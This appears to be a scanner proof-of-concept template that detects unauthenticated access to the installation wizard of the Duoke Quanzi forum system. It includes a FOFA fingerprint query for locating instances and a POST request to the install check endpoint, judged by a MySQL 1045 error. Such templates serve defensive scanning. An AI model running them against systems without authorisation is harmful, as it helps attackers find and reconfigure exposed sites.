id: poc-yaml-duokeduoke-install-unauthorized
info:
  name: 多客圈子论坛系统安装向导页面未授权访问漏洞
  severity: high
  tags:
  - 未授权访问
  finger: 多客圈子论坛
  fofa: body="/static/index/js/jweixin-1.2.0.js"
variables:
  path: '/

    /public/'
requests:
- method: POST
  path: '{{.path}}index.php/install/index/check'
  headers:
    Content-Type: application/json
  data: '{"hostname":"","hostport":"","database":"","username":"","password":"","charset":"","prefix":"","title":"","keywords":"","description":"","admin_title":"","admin_username":"","admin_password":""}'
  expression: "status_code == 200 &&\ncontains(body, \"Access denied for user\") &&\
    \ \ncontains(body,\"\\\"code\\\":1045\")\n"
transport: http
